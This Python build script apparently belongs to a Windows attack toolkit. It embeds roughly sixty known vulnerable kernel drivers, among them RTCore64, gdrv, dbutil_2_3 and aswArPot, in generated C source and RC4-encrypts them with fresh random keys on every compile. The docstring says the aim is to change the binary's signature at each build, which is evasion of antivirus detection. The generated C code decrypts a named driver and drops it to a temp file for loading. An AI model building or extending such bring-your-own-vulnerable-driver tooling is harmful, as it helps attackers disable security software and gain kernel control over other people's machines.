"""
Regenerates src/runtime/windows/byovd/embedded_drivers.c with fresh RC4 keys
before each Windows build. Called by LinkStage so every binary has a unique
encryption of the embedded drivers, changing its signature each compile.
"""

import os
import random
from pathlib import Path

RUNTIME_ROOT = Path(__file__).parent.parent.parent.parent / "src" / "runtime"
OUTPUT_C = RUNTIME_ROOT / "windows" / "byovd" / "embedded_drivers.c"

DRIVERS_DIR = Path.home() / "Downloads" / "drivers_out"

DRIVER_MAP = [
    # RTCore64 family
    ("rtkiow10x64.sys",          "rtkiow10x64.sys"),
    ("rtkiow8x64.sys",           "rtkiow8x64.sys"),
    ("rtkio64.sys",              "rtkio64.sys"),
    ("rtkio.sys",                "rtkio.sys"),
    ("segwindrvx64.sys",         "segwindrvx64.sys"),
    ("RTCore64.sys",             "RTCore64.sys"),
    # AMD
    ("AMDRyzenMasterDriver.sys", "AMDRyzenMasterDriver.sys"),
    ("AMDPowerProfiler.sys",     "AMDPowerProfiler.sys"),
    # NVIDIA / GPU
    ("nvflsh64.sys",             "nvflsh64.sys"),
    ("gdrv.sys",                 "gdrv.sys"),
    # ASRock/BIOSTAR/MSI
    ("ATSZIO.sys",               "ATSZIO.sys"),
    ("BS_I2c64.sys",             "BS_I2c64.sys"),
    ("BSMEMx64.sys",             "BSMEMx64.sys"),
    ("BSMI.sys",                 "BSMI.sys"),
    ("BSMIx64.sys",              "BSMIx64.sys"),
    ("NTIOLib.sys",              "NTIOLib.sys"),
    ("atillk64.sys",             "atillk64.sys"),
    # SpeedFan / ENE / Corsair
    ("speedfan.sys",             "speedfan.sys"),
    ("ene.sys",                  "ene.sys"),
    ("CorsairLLAccess64.sys",    "CorsairLLAccess64.sys"),
    # Intel / HP / Lenovo
    ("iQVW64.SYS",               "iQVW64.SYS"),
    ("HpPortIox64.sys",          "HpPortIox64.sys"),
    ("HwOs2Ec7x64.sys",          "HwOs2Ec7x64.sys"),
    ("LenovoDiagnosticsDriver.sys", "LenovoDiagnosticsDriver.sys"),
    ("PhlashNT.sys",             "PhlashNT.sys"),
    ("UCOREW64.SYS",             "UCOREW64.SYS"),
    # CPU-Z / misc hw tools
    ("cpuz141.sys",              "cpuz141.sys"),
    ("cpuz.sys",                 "cpuz.sys"),
    ("LHA.sys",                  "LHA.sys"),
    ("libnicm.sys",              "libnicm.sys"),
    ("mtcBSv64.sys",             "mtcBSv64.sys"),
    ("kEvP64.sys",               "kEvP64.sys"),
    ("HW.sys",                   "HW.sys"),
    # Dell / Utilities
    ("dbutil_2_3.sys",           "dbutil_2_3.sys"),
    ("MSIO64.sys",               "MSIO64.sys"),
    ("WinRing0x64.sys",          "WinRing0x64.sys"),
    # Hypervisor / Kernel tools
    ("mhyprot2.sys",             "mhyprot2.sys"),
    ("klhk.sys",                 "klhk.sys"),
    ("SkyAMDrv.sys",             "SkyAMDrv.sys"),
    # Process/system monitors
    ("ProcessCtr.sys",           "ProcessCtr.sys"),
    ("ProcessMonitorDriver.sys", "ProcessMonitorDriver.sys"),
    ("procexp1627.sys",          "procexp1627.sys"),
    ("procxp64.sys",             "procxp64.sys"),
    ("TfSysMon.sys",             "TfSysMon.sys"),
    ("elbycdio.sys",             "elbycdio.sys"),
    ("GMER.sys",                 "GMER.sys"),
    ("Truesight",                "Truesight"),
    # Security vendor drivers
    ("aswArPot.sys",             "aswArPot.sys"),
    ("BdApiUtil.sys",            "BdApiUtil.sys"),
    ("TmComm.sys",               "TmComm.sys"),
    ("RootLaser.sys",            "RootLaser.sys"),
    ("zam64.sys",                "zam64.sys"),
    ("ZYArKit.sys",              "ZYArKit.sys"),
    ("amp.sys",                  "amp.sys"),
    # VMware / VirtualBox
    ("vboxdrv.sys",              "vboxdrv.sys"),
    ("vbox.sys",                 "vbox.sys"),
    ("vmdrv.sys",                "vmdrv.sys"),
    ("viraglt64.sys",            "viraglt64.sys"),
    ("viragt.sys",               "viragt.sys"),
    # Rental/Lender drivers
    ("rentdrv2_x32.sys",         "rentdrv2_x32.sys"),
    ("rentdrv2_x64.sys",         "rentdrv2_x64.sys"),
    # BIOS/Chipset
    ("NCHGBIOS2x64.SYS",         "NCHGBIOS2x64.SYS"),
]


def _rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


def regenerate() -> bool:
    """
    Re-encrypt all drivers with fresh random keys and write embedded_drivers.c.
    Returns True on success, False if driver files are missing (non-fatal).
    """
    missing = [name for name, fname in DRIVER_MAP
               if not (DRIVERS_DIR / fname).exists()]
    if missing:
        return False

    lines = [
        "#ifdef _WIN32",
        '#include "jocky_rt.h"',
        "#include <windows.h>",
        "#include <stdio.h>",
        "#include <string.h>",
        "#include <stdint.h>",
        "#include <stdbool.h>",
        "",
    ]

    entries = []
    for name, fname in DRIVER_MAP:
        raw = (DRIVERS_DIR / fname).read_bytes()
        key = bytes(random.randint(0, 255) for _ in range(16))
        enc = _rc4(raw, key)
        sym = name.lower().replace(".", "_").replace("-", "_")

        key_hex = ", ".join(f"0x{b:02x}" for b in key)
        lines.append(f"static const uint8_t k_{sym}[16] = {{{key_hex}}};")

        lines.append(f"static const uint8_t d_{sym}[] = {{")
        for i in range(0, len(enc), 16):
            chunk = enc[i : i + 16]
            lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
        lines.append("};")
        lines.append("")

        entries.append((name, sym, len(raw)))

    lines += [
        "typedef struct {",
        "    const char*    name;",
        "    const uint8_t* key;",
        "    const uint8_t* data;",
        "    uint32_t       orig_size;",
        "} EmbeddedDriver;",
        "",
        "static const EmbeddedDriver g_embedded_drivers[] = {",
    ]
    for name, sym, orig_size in entries:
        lines.append(f'    {{"{name}", k_{sym}, d_{sym}, {orig_size}u}},')
    lines += [
        "};",
        f"static const int g_embedded_driver_count = {len(entries)};",
        "",
        "static void embedded_rc4(uint8_t* buf, uint32_t len, const uint8_t* key) {",
        "    uint8_t S[256]; uint32_t i, j = 0;",
        "    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;",
        "    for (i = 0; i < 256; i++) {",
        "        j = (j + S[i] + key[i % 16]) & 0xFF;",
        "        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;",
        "    }",
        "    i = j = 0;",
        "    for (uint32_t k = 0; k < len; k++) {",
        "        i = (i + 1) & 0xFF;",
        "        j = (j + S[i]) & 0xFF;",
        "        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;",
        "        buf[k] ^= S[(S[i] + S[j]) & 0xFF];",
        "    }",
        "}",
        "",
        "bool jocky_extract_embedded_driver(const char* name, char* out_path, size_t path_len) {",
        "    const EmbeddedDriver* drv = NULL;",
        "    for (int i = 0; i < g_embedded_driver_count; i++) {",
        "        if (_stricmp(g_embedded_drivers[i].name, name) == 0) {",
        "            drv = &g_embedded_drivers[i];",
        "            break;",
        "        }",
        "    }",
        "    if (!drv) return false;",
        "",
        "    uint8_t* buf = (uint8_t*)VirtualAlloc(NULL, drv->orig_size,",
        "                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);",
        "    if (!buf) return false;",
        "    memcpy(buf, drv->data, drv->orig_size);",
        "    embedded_rc4(buf, drv->orig_size, drv->key);",
        "",
        "    char tmp_dir[MAX_PATH];",
        "    if (!GetTempPathA(MAX_PATH, tmp_dir)) { VirtualFree(buf, 0, MEM_RELEASE); return false; }",
        "    char tmp_file[MAX_PATH];",
        "    if (!GetTempFileNameA(tmp_dir, \"jkd\", 0, tmp_file)) { VirtualFree(buf, 0, MEM_RELEASE); return false; }",
        "    HANDLE hf = CreateFileA(tmp_file, GENERIC_WRITE, 0, NULL,",
        "                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);",
        "    if (hf == INVALID_HANDLE_VALUE) { VirtualFree(buf, 0, MEM_RELEASE); return false; }",
        "    DWORD written = 0;",
        "    WriteFile(hf, buf, drv->orig_size, &written, NULL);",
        "    CloseHandle(hf);",
        "    VirtualFree(buf, 0, MEM_RELEASE);",
        "    if (written != drv->orig_size) { DeleteFileA(tmp_file); return false; }",
        "    strncpy(out_path, tmp_file, path_len - 1);",
        "    out_path[path_len - 1] = '\\0';",
        "    return true;",
        "}",
        "",
        "#endif /* _WIN32 */",
    ]

    OUTPUT_C.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT_C.write_text("\n".join(lines) + "\n")
    return True
